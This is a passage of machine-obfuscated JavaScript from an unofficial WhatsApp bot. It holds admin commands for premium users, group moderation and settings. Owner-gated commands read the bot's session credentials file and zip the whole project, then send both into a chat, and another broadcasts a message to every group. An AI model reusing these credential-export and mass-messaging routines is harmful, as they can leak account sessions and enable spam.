      if (_0x5328f2 === _0x4c1258) {
        let _0x54c492 = fs.readFileSync("./XeonMedia/apk/" + _0x4c1258 + ".apk");
        _0x4bd241(_0x54c492);
      }
    }
    const _0x421277 = _0x2af95c => {
      _0x2126c8.sendMessage(_0x496a83, {
        'document': _0x2af95c,
        'mimetype': "application/zip"
      }, {
        'quoted': _0x5cfbb1
      });
    };
    for (let _0x419dd8 of ZipXeon) {
      if (_0x5328f2 === _0x419dd8) {
        let _0x14d51b = fs.readFileSync("./XeonMedia/zip/" + _0x419dd8 + ".zip");
        _0x421277(_0x14d51b);
      }
    }
    const _0x50cee1 = _0x1c19d0 => {
      haikal.sendMessage(_0x496a83, {
        'document': _0x1c19d0,
        'mimetype': "application/pdf"
      }, {
        'quoted': _0x5cfbb1
      });
    };
    for (let _0x31bcba of DocXeon) {
      if (_0x5328f2 === _0x31bcba) {
        let _0x28b5a3 = fs.readFileSync("./XeonMedia/doc/" + _0x31bcba + ".pdf");
        _0x50cee1(_0x28b5a3);
      }
    }
    if (_0x5cfbb1.isGroup && !_0x5cfbb1.key.fromMe) {
      let _0x155f8e = [...new Set([...(_0x5cfbb1.mentionedJid || []), ...(_0x5cfbb1.quoted ? [_0x5cfbb1.quoted.sender] : [])])];
      for (let _0x1b995e of _0x155f8e) {
        if (afk.checkAfkUser(_0x1b995e, _afk)) {
          let _0x4f4dd6 = afk.getAfkId(_0x1b995e, _afk);
          let _0x420578 = afk.getAfkReason(_0x4f4dd6, _afk);
          _0x36440f("Don't tag him, he's afk\n\n*Reason :* " + _0x420578);
        }
      }
      if (afk.checkAfkUser(_0x5cfbb1.sender, _afk)) {
        _afk.splice(afk.getAfkPosition(_0x5cfbb1.sender, _afk), 0x1);
        fs.writeFileSync("./database/afk-user.json", JSON.stringify(_afk));
        _0x2126c8.sendTextWithMentions(_0x5cfbb1.chat, '@' + _0x5cfbb1.sender.split('@')[0x0] + " have returned from afk", _0x5cfbb1);
      }
    }
    switch (_0x5ebe26) {
      case "addprem":
        if (!_0x4fbeb2) {
          return _0x36440f(mess.owner);
        }
        if (_0x4f8c4e.length < 0x2) {
          return _0x36440f("Use :\n*#addprem* @tag time\n*#addprem* number time\n\nExample : #addprem @tag 30d");
        }
        if (_0x5cfbb1.mentionedJid.length !== 0x0) {
          for (let _0x1e3164 = 0x0; _0x1e3164 < _0x5cfbb1.mentionedJid.length; _0x1e3164++) {
            addPremiumUser(_0x5cfbb1.mentionedJid[0x0], _0x4f8c4e[0x1], premium);
          }
          _0x36440f("Premium Success");
        } else {
          addPremiumUser(_0x4f8c4e[0x0] + "@s.whatsapp.net", _0x4f8c4e[0x1], premium);
          _0x36440f('Success');
        }
        break;
      case "delprem":
        if (!_0x4fbeb2) {
          return _0x36440f(mess.owner);
        }
        if (_0x4f8c4e.length < 0x1) {
          return _0x36440f("Use :\n*#delprem* @tag\n*#delprem* number");
        }
        if (_0x5cfbb1.mentionedJid.length !== 0x0) {
          for (let _0x158a16 = 0x0; _0x158a16 < _0x5cfbb1.mentionedJid.length; _0x158a16++) {
            premium.splice(getPremiumPosition(_0x5cfbb1.mentionedJid[_0x158a16], premium), 0x1);
            fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
          }
          _0x36440f("Delete success");
        } else {
          premium.splice(getPremiumPosition(_0x4f8c4e[0x0] + '@s.whatsapp.net', premium), 0x1);
          fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
          _0x36440f("Success");
        }
        break;
      case "listprem":
        {
          if (!_0x4fbeb2) {
            return _0x36440f(mess.owner);
          }
          let _0x480393 = require("./database/premium.json");
          let _0x4b5edc = "*------「 LIST PREMIUM 」------*\n\n";
          for (let _0x4d8638 of _0x480393) {
            _0x4b5edc += "Number : " + _0x4d8638.id + "\n";
            _0x4b5edc += "Expired : " + _0x4d8638.expired + " Second\n";
          }
          _0x2126c8.sendMessage(_0x5cfbb1.chat, {
            'text': _0x4b5edc,
            'mentions': i
          }, {
            'quoted': _0x5cfbb1
          });
        }
        break;
      case "deletesession":
      case "delsession":
      case "clearsession":
        {
          if (!_0x4fbeb2) {
            return _0x36440f(mess.owner);
          }
          fs.readdir("./session", async function (_0x38cac3, _0x3890ca) {
            if (_0x38cac3) {
              console.log("Unable to scan directory: " + _0x38cac3);
              return _0x36440f("Unable to scan directory: " + _0x38cac3);
            }
            let _0x2bc76d = await _0x3890ca.filter(_0x168e0f => _0x168e0f.startsWith('pre-key') || _0x168e0f.startsWith('sender-key') || _0x168e0f.startsWith("session-") || _0x168e0f.startsWith('app-state'));
            console.log(_0x2bc76d.length);
            let _0x186f61 = "Detected " + _0x2bc76d.length + " junk files\n\n";
            if (_0x2bc76d.length == 0x0) {
              return _0x36440f(_0x186f61);
            }
            _0x2bc76d.map(function (_0x1a56a9, _0x106328) {
              _0x186f61 += _0x106328 + 0x1 + (". " + _0x1a56a9 + "\n");
            });
            _0x36440f(_0x186f61);
            await sleep(0x7d0);
            _0x36440f("Delete junk files...");
            await _0x2bc76d.forEach(function (_0x4cc72a) {
              fs.unlinkSync("./session/" + _0x4cc72a);
            });
            await sleep(0x7d0);
            _0x36440f("Successfully deleted all the trash in the session folder");
          });
        }
        break;
      case 'join':
        try {
          if (!_0x4fbeb2) {
            return _0x36440f(mess.owner);
          }
          if (!_0x5a4036) {
            return _0x36440f("Enter Group Link!");
          }
          if (!isUrl(_0x4f8c4e[0x0]) && !_0x4f8c4e[0x0].includes("whatsapp.com")) {
            return _0x36440f("Link Invalid!");
          }
          _0x36440f(mess.wait);
          let _0x9a2823 = _0x4f8c4e[0x0].split("https://chat.whatsapp.com/")[0x1];
          await _0x2126c8.groupAcceptInvite(_0x9a2823).then(_0x450961 => _0x36440f(json(_0x450961)))["catch"](_0x3b1fa0 => _0x36440f(json(_0x3b1fa0)));
        } catch {
          _0x36440f("Failed to join the Group");
        }
        break;
      case "getsession":
        if (!_0x4fbeb2) {
          return _0x36440f(mess.owner);
        }
        _0x36440f("Wait a moment, currently retrieving your session file");
        let _0x10061a = await fs.readFileSync("./session/creds.json");
        _0x2126c8.sendMessage(_0x5cfbb1.chat, {
          'document': _0x10061a,
          'mimetype': "application/json",
          'fileName': 'creds.json'
        }, {
          'quoted': _0x5cfbb1
        });
        break;
      case 'shutdown':
        if (!_0x4fbeb2) {
          return _0x36440f(mess.owner);
        }
        _0x36440f("Danny is saying Goodbye🖐");
        await sleep(0xbb8);
        process.exit();
        break;
      case "restart":
        if (!_0x4fbeb2) {
          return _0x36440f(mess.owner);
        }
        _0x36440f("In Process....");
        exec("pm2 restart all");
        break;
      case "autoread":
        if (!_0x4fbeb2) {
          return _0x36440f(mess.owner);
        }
        if (_0x4f8c4e.length < 0x1) {
          return _0x36440f("Example " + (_0x2507cf + _0x5ebe26) + " on/off");
        }
        if (q === 'on') {
          autoread = true;
          _0x36440f("creepy changed autoread to " + q);
        } else if (q === "off") {
          autoread = false;
          _0x36440f("creepy changed autoread to " + q);
        }
        break;
      case "autotyping":
        if (!_0x4fbeb2) {
          return _0x36440f(mess.owner);
        }
        if (_0x4f8c4e.length < 0x1) {
          return _0x36440f("Example " + (_0x2507cf + _0x5ebe26) + " on/off");
        }
        if (q === 'on') {
          autoTyping = true;
          _0x36440f("creepy changed auto-typing to " + q);
        } else if (q === "off") {
          autoTyping = false;
          _0x36440f("creepy changed auto-typing to " + q);
        }
        break;
      case 'autorecording':
        if (!_0x4fbeb2) {
          return _0x36440f(mess.owner);
        }
        if (_0x4f8c4e.length < 0x1) {
          return _0x36440f("Example " + (_0x2507cf + _0x5ebe26) + " on/off");
        }
        if (q === 'on') {
          autoRecording = true;
          _0x36440f("creepy changed auto-recording to " + q);
        } else if (q === 'off') {
          autoRecording = false;
          _0x36440f("creepy changed auto-recording to " + q);
        }
        break;
      case "autorecordtyp":
        if (!_0x4fbeb2) {
          return _0x36440f(mess.owner);
        }
        if (_0x4f8c4e.length < 0x1) {
          return _0x36440f("Example " + (_0x2507cf + _0x5ebe26) + " on/off");
        }
        if (q === 'on') {
          autorecordtype = true;
          _0x36440f("creepy changed auto recording and typing to " + q);
        } else if (q === "off") {
          autorecordtype = false;
          _0x36440f("creepy changed auto recording and typing to " + q);
        }
        break;
      case "autoswview":
      case 'autostatusview':
        {
          if (!_0x4fbeb2) {
            return _0x36440f(mess.owner);
          }
          if (_0x4f8c4e.length < 0x1) {
            return _0x36440f("on/off?");
          }
          if (_0x4f8c4e[0x0] === 'on') {
            autoswview = true;
            _0x36440f(_0x5ebe26 + " is enabled");
          } else if (_0x4f8c4e[0x0] === "off") {
            autoswview = false;
            _0x36440f(_0x5ebe26 + " is disabled");
          }
        }
        break;
      case "autobio":
        if (!_0x4fbeb2) {
          return _0x36440f(mess.owner);
        }
        if (_0x4f8c4e.length < 0x1) {
          return _0x36440f("Example " + (_0x2507cf + _0x5ebe26) + " on/off");
        }
        if (q == 'on') {
          autobio = true;
          _0x36440f("creepy Changed AutoBio To " + q);
        } else if (q == "off") {
          autobio = false;
          _0x36440f("creepy Changed AutoBio To " + q);
        }
        break;
      case "mode":
        if (!_0x4fbeb2) {
          return _0x36440f(mess.owner);
        }
        if (_0x4f8c4e.length < 0x1) {
          return _0x36440f("Example " + (_0x2507cf + _0x5ebe26) + " public/self");
        }
        if (q == "public") {
          _0x2126c8['public'] = true;
          _0x36440f(mess.done);
        } else if (q == "self") {
          _0x2126c8['public'] = false;
          _0x36440f(mess.done);
        }
        break;
      case "setexif":
        if (!_0x4fbeb2) {
          return _0x36440f(mess.owner);
        }
        if (!_0x5a4036) {
          return _0x36440f("Example : " + (_0x2507cf + _0x5ebe26) + " packname|author");
        }
        global.packname = _0x5a4036.split('|')[0x0];
        global.author = _0x5a4036.split('|')[0x1];
        _0x36440f("Exif creepy changed to\n\n• Packname : " + global.packname + "\n• Author : " + global.author);
        break;
      case "setpp":
      case "setpp":
      case "setppbot":
        if (!_0x4fbeb2) {
          return _0x36440f(mess.owner);
        }
        if (!_0x1ea160) {
          return _0x36440f("Send/Reply Image With Caption " + (_0x2507cf + _0x5ebe26));
        }
        if (!/image/.test(_0x455bd4)) {
          return _0x36440f("Send/Reply Image With Caption " + (_0x2507cf + _0x5ebe26));
        }
        if (/webp/.test(_0x455bd4)) {
          return _0x36440f("Send/Reply Image With Caption " + (_0x2507cf + _0x5ebe26));
        }
        var _0x1719c7 = await _0x2126c8.downloadAndSaveMediaMessage(_0x1ea160, "ppbot.jpeg");
        if (_0x4f8c4e[0x0] == "full") {
          var {
            img: _0x28cc12
          } = await generateProfilePicture(_0x1719c7);
          await _0x2126c8.query({
            'tag': 'iq',
            'attrs': {
              'to': _0x2a1e36,
              'type': 'set',
              'xmlns': "w:profile:picture"
            },
            'content': [{
              'tag': "picture",
              'attrs': {
                'type': "image"
              },
              'content': _0x28cc12
            }]
          });
          fs.unlinkSync(_0x1719c7);
          _0x36440f(mess.done);
        } else {
          var _0x195e8a = await _0x2126c8.updateProfilePicture(_0x2a1e36, {
            'url': _0x1719c7
          });
          fs.unlinkSync(_0x1719c7);
          _0x36440f(mess.done);
        }
        break;
      case "block":
        if (!_0x4fbeb2) {
          return _0x36440f(mess.owner);
        }
        let _0x154ceb = _0x5cfbb1.mentionedJid[0x0] ? _0x5cfbb1.mentionedJid[0x0] : _0x5cfbb1.quoted ? _0x5cfbb1.quoted.sender : _0x5a4036.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        await _0x2126c8.updateBlockStatus(_0x154ceb, "block").then(_0x444544 => _0x36440f(json(_0x444544)))["catch"](_0x971699 => _0x36440f(json(_0x971699)));
        break;
      case "unblock":
        if (!_0x4fbeb2) {
          return _0x36440f(mess.owner);
        }
        let _0x31f88e = _0x5cfbb1.mentionedJid[0x0] ? _0x5cfbb1.mentionedJid[0x0] : _0x5cfbb1.quoted ? _0x5cfbb1.quoted.sender : _0x5a4036.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        await _0x2126c8.updateBlockStatus(_0x31f88e, "unblock").then(_0x665e6f => _0x36440f(json(_0x665e6f)))["catch"](_0x4a3e65 => _0x36440f(json(_0x4a3e65)));
        break;
      case "leave":
        if (!_0x4fbeb2) {
          return _0x36440f(mess.owner);
        }
        if (!_0x5cfbb1.isGroup) {
          return _0x36440f(mess.group);
        }
        _0x36440f("Bye Everyone 🥺");
        await _0x2126c8.groupLeave(_0x5cfbb1.chat);
        break;
      case 'backup':
        if (!_0x4fbeb2) {
          return _0x36440f(mess.owner);
        }
        if (_0x5cfbb1.isGroup) {
          return _0x36440f(mess['private']);
        }
        _0x36440f(mess.wait);
        exec("zip backup.zip *");
        let _0x1c9f58 = await fs.readFileSync("./backup.zip");
        await _0x2126c8.sendMessage(_0x5cfbb1.chat, {
          'document': _0x1c9f58,
          'mimetype': "application/zip",
          'fileName': 'backup.zip'
        }, {
          'quoted': _0x5cfbb1
        });
        break;
      case "bcgc":
      case "bcgroup":
        {
          if (!_0x4fbeb2) {
            return _0x36440f(mess.owner);
          }
          if (!_0x5a4036) {
            return _0x36440f("Which text?\n\nExample : " + (_0x2507cf + _0x5ebe26) + " It's holiday tomorrow ");
          }
          let _0x2f74cd = await _0x2126c8.groupFetchAllParticipating();
          let _0x22192e = Object.entries(_0x2f74cd).slice(0x0).map(_0xac5b11 => _0xac5b11[0x1]);
          let _0x1505c8 = _0x22192e.map(_0x3c2cd0 => _0x3c2cd0.id);
          _0x36440f("Send Broadcast To " + _0x1505c8.length + " Group Chat, End Time " + _0x1505c8.length * 1.5 + " second");
          for (let _0x5b6290 of _0x1505c8) {
            await sleep(0x5dc);
            let _0x28f826 = "```" + ("\n\n" + _0x5a4036 + "\n\n") + "```" + "\n\n\nʙʀᴏᴀᴅᴄᴀsᴛ";
            _0x2126c8.sendMessage(_0x5b6290, {
              'text': _0x28f826,
              'contextInfo': {
                'externalAdReply': {
                  'showAdAttribution': true,
                  'title': "Broadcast By Owner",
                  'body': "Sent " + _0x5b6290.length + " Group",
                  'thumbnailUrl': "https://imgur.com/a/AApdZU4.jpeg",
                  'sourceUrl': global.link,
                  'mediaType': 0x1,
                  'renderLargerThumbnail': true
                }
              }
            });
          }
          _0x36440f("creepy Sent Broadcast To " + _0x1505c8.length + " Group");
        }
        break;
      case "getcase":
        if (!_0x4fbeb2) {
          return _0x36440f(mess.owner);
        }
        _0x36440f('' + ('case' + ("'" + q + "'") + fs.readFileSync('XeonBug3.js').toString().split("case '" + q + "'")[0x1].split('break')[0x0] + 'break'));
        break;
      case 'delete':
      case "del":
        {
          if (!_0x4fbeb2) {
            return _0x36440f(mess.done);
          }
          if (!_0x5cfbb1.quoted) {
            throw false;
          }
          let {
            chat: _0x36eb1c,
            fromMe: _0x1ab0e1,
            id: _0x1e091d,
            isBaileys: _0x1fe61b
          } = _0x5cfbb1.quoted;
          if (!_0x1fe61b) {
            return _0x36440f("The message was not sent by a creepy");
          }
          _0x2126c8.sendMessage(_0x5cfbb1.chat, {
            'delete': {
              'remoteJid': _0x5cfbb1.chat,
              'fromMe': true,
              'id': _0x5cfbb1.quoted.id,
              'participant': _0x5cfbb1.quoted.sender
            }
          });
        }
        break;
      case "closetime":
        if (!_0x5cfbb1.isGroup) {
          return _0x36440f(mess.group);
        }
        if (!_0x105f82 && !_0x4fbeb2) {
          return _0x36440f(mess.admin);
        }
        if (!_0x4be750) {
          return _0x36440f(mess.botAdmin);
        }
        if (_0x4f8c4e[0x1] == "detik") {
          var _0x4345ed = _0x4f8c4e[0x0] * "1000";
        } else {
          if (_0x4f8c4e[0x1] == "menit") {
            var _0x4345ed = _0x4f8c4e[0x0] * "60000";
          } else {
            if (_0x4f8c4e[0x1] == 'jam') {
              var _0x4345ed = _0x4f8c4e[0x0] * "3600000";
            } else {
              if (_0x4f8c4e[0x1] == 'hari') {
                var _0x4345ed = _0x4f8c4e[0x0] * "86400000";
              } else {
                return _0x36440f("*Choose:*\nsecond\nminute\nhour\nday\n\n*Example*\n10 second");
              }
            }
          }
        }
        _0x36440f("Close time " + q + " starting from now");
        setTimeout(() => {
          _0x2126c8.groupSettingUpdate(_0x5cfbb1.chat, "announcement");
          _0x36440f("*Closed* group closed by admin\nnow only admin can send messages");
        }, _0x4345ed);
        break;
      case 'opentime':
        if (!_0x5cfbb1.isGroup) {
          return _0x36440f(mess.group);
        }
        if (!_0x105f82 && !_0x4fbeb2) {
          return _0x36440f(mess.admin);
        }
        if (!_0x4be750) {
          return _0x36440f(mess.botAdmin);
        }
        if (_0x4f8c4e[0x1] == "second") {
          var _0x4345ed = _0x4f8c4e[0x0] * "1000";
        } else {
          if (_0x4f8c4e[0x1] == "minute") {
            var _0x4345ed = _0x4f8c4e[0x0] * "60000";
          } else {
            if (_0x4f8c4e[0x1] == "hour") {
              var _0x4345ed = _0x4f8c4e[0x0] * "3600000";
            } else {
              if (_0x4f8c4e[0x1] == "day") {
                var _0x4345ed = _0x4f8c4e[0x0] * "86400000";
              } else {
                return _0x36440f("*Choose:*\nsecond\nminute\nhour\nday\n\n*Example*\n10 second");
              }
            }
          }
        }
        _0x36440f("Open time " + q + " starting from now");
        setTimeout(() => {
          _0x2126c8.groupSettingUpdate(_0x5cfbb1.chat, 'not_announcement');
          _0x36440f("*Opened* The group is opened by admin\nNow members can send messages");
        }, _0x4345ed);
        break;
      case "kick":
        if (!_0x5cfbb1.isGroup) {
          return _0x36440f(mess.group);
        }
        if (!_0x105f82 && !_0x1afc0e && !_0x4fbeb2) {
          return _0x36440f(mess.admin);
        }
        if (!_0x4be750) {
          return _0x36440f(mess.botAdmin);
        }
        let _0x17b804 = _0x5cfbb1.mentionedJid[0x0] ? _0x5cfbb1.mentionedJid[0x0] : _0x5cfbb1.quoted ? _0x5cfbb1.quoted.sender : _0x5a4036.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        await _0x2126c8.groupParticipantsUpdate(_0x5cfbb1.chat, [_0x17b804], 'remove').then(_0x1b31df => _0x36440f(json(_0x1b31df)))["catch"](_0x31031b => _0x36440f(json(_0x31031b)));
        break;
      case "add":
        if (!_0x5cfbb1.isGroup) {
          return _0x36440f(mess.group);
        }
        if (!_0x105f82 && !_0x1afc0e && !_0x4fbeb2) {
          return _0x36440f(mess.admin);
        }
        if (!_0x4be750) {
          return _0x36440f(mess.botAdmin);
        }
        let _0x5835b3 = _0x5cfbb1.quoted ? _0x5cfbb1.quoted.sender : _0x5a4036.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        await _0x2126c8.groupParticipantsUpdate(_0x5cfbb1.chat, [_0x5835b3], "add").then(_0x2e0843 => _0x36440f(json(_0x2e0843)))['catch'](_0x41fbd7 => _0x36440f(json(_0x41fbd7)));
        break;
      case "promote":
        if (!_0x5cfbb1.isGroup) {
          return _0x36440f(mess.group);
        }
        if (!_0x105f82 && !_0x1afc0e && !_0x4fbeb2) {
          return _0x36440f(mess.admin);
        }
        if (!_0x4be750) {
          return _0x36440f(mess.botAdmin);
        }
        let _0x57e2f6 = _0x5cfbb1.mentionedJid[0x0] ? _0x5cfbb1.mentionedJid[0x0] : _0x5cfbb1.quoted ? _0x5cfbb1.quoted.sender : _0x5a4036.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        await _0x2126c8.groupParticipantsUpdate(_0x5cfbb1.chat, [_0x57e2f6], "promote").then(_0x40055a => _0x36440f(json(_0x40055a)))["catch"](_0x3eeb43 => _0x36440f(json(_0x3eeb43)));
        break;
      case "demote":
        if (!_0x5cfbb1.isGroup) {
          return _0x36440f(mess.group);
        }
        if (!_0x105f82 && !_0x1afc0e && !_0x4fbeb2) {
          return _0x36440f(mess.admin);
        }
        if (!_0x4be750) {
          return _0x36440f(mess.botAdmin);
        }
        let _0x5d1236 = _0x5cfbb1.mentionedJid[0x0] ? _0x5cfbb1.mentionedJid[0x0] : _0x5cfbb1.quoted ? _0x5cfbb1.quoted.sender : _0x5a4036.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        await _0x2126c8.groupParticipantsUpdate(_0x5cfbb1.chat, [_0x5d1236], "demote").then(_0x33b53c => _0x36440f(json(_0x33b53c)))["catch"](_0x5b5829 => _0x36440f(json(_0x5b5829)));
        break;
      case "setname":
      case "setsubject":
        if (!_0x5cfbb1.isGroup) {
          return _0x36440f(mess.group);
        }
        if (!_0x105f82 && !_0x1afc0e && !_0x4fbeb2) {
          return _0x36440f(mess.admin);
        }
        if (!_0x4be750) {
          return _0x36440f(mess.botAdmin);
        }
        if (!_0x5a4036) {
          return "Text ?";
        }
        await _0x2126c8.groupUpdateSubject(_0x5cfbb1.chat, _0x5a4036).then(_0x3bdcba => _0x36440f(mess.success))['catch'](_0x9a927f => _0x36440f(json(_0x9a927f)));
        break;
      case "setdesc":
      case "setdesk":
        if (!_0x5cfbb1.isGroup) {
          return _0x36440f(mess.group);
        }
        if (!_0x105f82 && !_0x1afc0e && !_0x4fbeb2) {
          return _0x36440f(mess.admin);
        }
        if (!_0x4be750) {
          return _0x36440f(mess.botAdmin);
        }
        if (!_0x5a4036) {
          return "Text ?";
        }
        await _0x2126c8.groupUpdateDescription(_0x5cfbb1.chat, _0x5a4036).then(_0x1fbf95 => _0x36440f(mess.success))["catch"](_0x58644d => _0x36440f(json(_0x58644d)));
        break;
      case 'setppgroup':
      case "setppgrup":
      case "setppgc":
        if (!_0x5cfbb1.isGroup) {
          return _0x36440f(mess.group);
        }
        if (!_0x105f82) {
          return _0x36440f(mess.admin);
        }
        if (!_0x4be750) {
          return _0x36440f(mess.botAdmin);
        }
        if (!_0x1ea160) {
          return _0x36440f("Send/Reply Image With Caption " + (_0x2507cf + _0x5ebe26));
        }
        if (!/image/.test(_0x455bd4)) {
          return _0x36440f("Send/Reply Image With Caption " + (_0x2507cf + _0x5ebe26));
        }
        if (/webp/.test(_0x455bd4)) {
          return _0x36440f("Send/Reply Image With Caption " + (_0x2507cf + _0x5ebe26));
        }
        var _0x1719c7 = await _0x2126c8.downloadAndSaveMediaMessage(_0x1ea160, "ppbot.jpeg");
        if (_0x4f8c4e[0x0] == "full") {
          var {
            img: _0x28cc12
          } = await generateProfilePicture(_0x1719c7);
          await _0x2126c8.query({
            'tag': 'iq',
            'attrs': {
              'to': _0x5cfbb1.chat,
              'type': 'set',
              'xmlns': "w:profile:picture"
            },
            'content': [{
              'tag': "picture",
              'attrs': {
                'type': "image"
              },
              'content': _0x28cc12
            }]
          });
          fs.unlinkSync(_0x1719c7);
          _0x36440f(mess.done);
        } else {
          var _0x195e8a = await _0x2126c8.updateProfilePicture(_0x5cfbb1.chat, {
            'url': _0x1719c7
          });
          fs.unlinkSync(_0x1719c7);
          _0x36440f(mess.done);
        }
        break;
      case 'tagall':
        if (!_0x5cfbb1.isGroup) {
          return _0x36440f(mess.group);
        }
        if (!_0x105f82 && !_0x1afc0e && !_0x4fbeb2 && !_0x573dd7) {
          return _0x36440f(mess.admin);
        }
        if (!_0x4be750 && !_0x4fbeb2 && !_0x573dd7) {
          return _0x36440f(mess.botAdmin);
        }
        let _0x4045f7 = "*CREEPY-MD*👥 *Tag All*\n \n By_Danny&praisy✍️ *Message : " + (q ? q : "😁") + "*\n\n";
        for (let _0x34abb8 of _0x425c8a) {
          _0x4045f7 += "• @" + _0x34abb8.id.split('@')[0x0] + "\n";
        }
        _0x2126c8.sendMessage(_0x5cfbb1.chat, {
          'text': _0x4045f7,
          'mentions': _0x425c8a.map(_0x4432d4 => _0x4432d4.id)
        }, {
          'quoted': _0x5cfbb1
        });
        break;
      case "hidetag":
        if (!_0x5cfbb1.isGroup) {
          return _0x36440f(mess.group);
        }
        if (!_0x105f82 && !_0x1afc0e && !_0x4fbeb2 && !_0x573dd7) {
          return _0x36440f(mess.admin);
        }
        if (!_0x4be750 && !_0x4fbeb2 && !_0x573dd7) {
          return _0x36440f(mess.botAdmin);
        }
        _0x2126c8.sendMessage(_0x5cfbb1.chat, {
          'text': q ? q : '',
          'mentions': _0x425c8a.map(_0x7534c8 => _0x7534c8.id)
        }, {
          'quoted': _0x5cfbb1
        });
        break;
      case "totag":
        if (!_0x5cfbb1.isGroup) {
          return _0x36440f(mess.group);
        }
        if (!_0x4be750 && !_0x4fbeb2 && !_0x573dd7) {
          return _0x36440f(mess.botAdmin);
        }
        if (!_0x105f82 && !_0x4fbeb2 && !_0x573dd7) {
          return _0x36440f(mess.admin);
        }
        if (!_0x5cfbb1.quoted) {
          return _0x36440f("Reply messages with captions " + (_0x2507cf + _0x5ebe26));
        }
        _0x2126c8.sendMessage(_0x5cfbb1.chat, {
          'forward': _0x5cfbb1.quoted.fakeObj,
          'mentions': _0x425c8a.map(_0x56e001 => _0x56e001.id)
        });
        break;
      case 'group':
      case "grup":
        if (!_0x5cfbb1.isGroup) {
          return _0x36440f(mess.group);
        }
        if (!_0x105f82 && !_0x1afc0e && !_0x4fbeb2) {
          return _0x36440f(mess.admin);
        }
        if (!_0x4be750) {
          return _0x36440f(mess.botAdmin);
        }
        if (_0x4f8c4e[0x0] === "close") {
          await _0x2126c8.groupSettingUpdate(_0x5cfbb1.chat, "announcement").then(_0x5eb853 => _0x36440f("Group closed by creepy 🕊️"))["catch"](_0x31a17e => _0x36440f(json(_0x31a17e)));
        } else if (_0x4f8c4e[0x0] === "open") {
          await _0x2126c8.groupSettingUpdate(_0x5cfbb1.chat, "not_announcement").then(_0x2404e0 => _0x36440f("Group opened by creepy🕊️"))["catch"](_0x4751fe => _0x36440f(json(_0x4751fe)));
        } else {
          _0x36440f("Mode " + _0x5ebe26 + "\n\n\nType " + (_0x2507cf + _0x5ebe26) + "open/close");
        }
        break;
      case 'editinfo':
        if (!_0x5cfbb1.isGroup) {
          return _0x36440f(mess.group);
        }
        if (!_0x105f82 && !_0x1afc0e && !_0x4fbeb2) {
          return _0x36440f(mess.admin);
        }
        if (!_0x4be750) {
          return _0x36440f(mess.botAdmin);
        }
        if (_0x4f8c4e[0x0] === "open") {
          await _0x2126c8.groupSettingUpdate(_0x5cfbb1.chat, "unlocked").then(_0x4b93ec => _0x36440f("Successfully Opened Group Edit Info 🕊️"))["catch"](_0x427f89 => _0x36440f(json(_0x427f89)));
        } else if (_0x4f8c4e[0x0] === "close") {
          await _0x2126c8.groupSettingUpdate(_0x5cfbb1.chat, 'locked').then(_0x557d08 => _0x36440f("Successfully Closed Group Edit Info🕊️"))['catch'](_0x18fe12 => _0x36440f(json(_0x18fe12)));
        } else {
          _0x36440f("Mode " + _0x5ebe26 + "\n\n\nType " + (_0x2507cf + _0x5ebe26) + "on/off");
        }
        break;
      case 'linkgroup':
      case "grouplink":
      case "linkgrup":
      case "linkgc":
        if (!_0x5cfbb1.isGroup) {
          return _0x36440f(mess.group);
        }
        if (!_0x105f82 && !_0x1afc0e && !_0x4fbeb2) {
          return _0x36440f(mess.admin);
        }
        if (!_0x4be750) {
          return _0x36440f(mess.botAdmin);
        }
        let _0x27cbf1 = await _0x2126c8.groupInviteCode(_0x5cfbb1.chat);
        _0x2126c8.sendText(_0x5cfbb1.chat, "👥 *GROUP INFO*\n📛 *Name :* " + _0x3481d5.subject + "\n👤 *Group Owner :* " + (_0x3481d5.owner !== undefined ? '@' + _0x3481d5.owner.split`@`[0x0] : "Not known") + "\n🌱 *ID :* " + _0x3481d5.id + "\n🔗 *Chat Link :* https://chat.whatsapp.com/" + _0x27cbf1 + "\n👥 *Members :* " + _0x3481d5.participants.length + "\n", _0x5cfbb1, {
          'detectLink': true
        });
        break;
      case "revoke":
      case "resetlink":
        if (!_0x5cfbb1.isGroup) {
          return _0x36440f(mess.group);
        }
        if (!_0x105f82 && !_0x1afc0e && !_0x4fbeb2) {
          return _0x36440f(mess.admin);
        }
        if (!_0x4be750) {
          return _0x36440f(mess.botAdmin);
        }
        await _0x2126c8.groupRevokeInvite(_0x5cfbb1.chat).then(_0x3a73de => {
          _0x36440f("creepy Reset, Group Invite Link " + _0x3481d5.subject);
        })['catch'](_0x3da574 => _0x36440f(json(_0x3da574)));
        break;
      case 'p':
      case 'ping':
        {
          const _0x51afe8 = process.memoryUsage();
          const _0x3c2d62 = os.cpus().map(_0x6d56bc => {
            _0x6d56bc.total = Object.keys(_0x6d56bc.times).reduce((_0x502acd, _0x36597e) => _0x502acd + _0x6d56bc.times[_0x36597e], 0x0);
            return _0x6d56bc;
          });
          const _0xaaeaae = _0x3c2d62.reduce((_0x24763, _0x30d0f7, _0x5304ee, {
            length: _0x1fa726
          }) => {
            _0x24763.total += _0x30d0f7.total;
            _0x24763.speed += _0x30d0f7.speed / _0x1fa726;
            _0x24763.times.user += _0x30d0f7.times.user;
            _0x24763.times.nice += _0x30d0f7.times.nice;
            _0x24763.times.sys += _0x30d0f7.times.sys;
            _0x24763.times.idle += _0x30d0f7.times.idle;
            _0x24763.times.irq += _0x30d0f7.times.irq;
            return _0x24763;
          }, {
            'speed': 0x0,
            'total': 0x0,
            'times': {
              'user': 0x0,
              'nice': 0x0,
              'sys': 0x0,
              'idle': 0x0,
              'irq': 0x0
            }
          });
          let _0x4b7be7 = speed();
          let _0x1f0999 = speed() - _0x4b7be7;
          neww = performance.now();
          oldd = performance.now();
